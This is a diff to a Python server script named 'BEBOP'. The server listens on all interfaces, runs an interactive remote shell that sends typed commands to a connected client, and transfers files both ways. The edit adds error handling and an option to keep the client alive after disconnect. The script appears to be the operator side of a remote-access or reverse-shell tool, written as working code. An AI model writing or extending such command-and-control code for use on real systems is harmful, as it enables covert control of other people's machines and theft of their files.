@@ -4,7 +4,7 @@ import threading
 import time
 import os
 
-address = ("0.0.0.0", 55000)
+address = ("0.0.0.0", 5000)
 
 def print_menu():
     print("\n/-------BEBOP-------/\n")
@@ -15,6 +15,8 @@ def print_menu():
 
 def recv(buff_size=1024):
     data_size = int(conn_to_client.recv(12).decode())
+    if not data_size:
+        return None
 
     data = bytes()
     while len(data) < data_size:
@@ -29,20 +31,25 @@ def send(data):
     conn_to_client.send(data_size.encode())
     conn_to_client.sendall(data)
 
-def download_file(file_name, file_path=os.getcwd()):
-    file_data = recv()
-    file = open(f"{file_path}{os.path.sep}{file_name}", "wb")
-    file.write(file_data)
-    file.close()
-
 def upload_file(file_name):
     try:
         with open(f"{file_name}", "rb") as file:
             file_data = file.read()
             send(file_data)
+
     except FileNotFoundError:
         print("Could not find file. Make sure file is in the same directory as this script.")
         send(b'')
+
+def download_file(file_name, file_path=os.getcwd()):
+    file_data = recv()
+    if not file_data:
+        print("Could not download file.")
+        return
+
+    file = open(f"{file_path}{os.path.sep}{file_name}", "wb")
+    file.write(file_data)
+    file.close()
 
 def open_shell():
     while True:
@@ -69,7 +76,8 @@ def open_shell():
 
         send(cmd.encode())
         output = recv()
-        print(output.decode())
+        if output:
+            print(output.decode())
 
 
 def establish_connection(address):
@@ -103,6 +111,8 @@ def main():
             pass
 
         elif choice == "4":
+            keep_alive = input("Keep client alive? (Y or N): ")
+            send(keep_alive.encode())
             conn_to_client.shutdown(socket.SHUT_WR)
             conn_to_client.close()
             sys.exit()
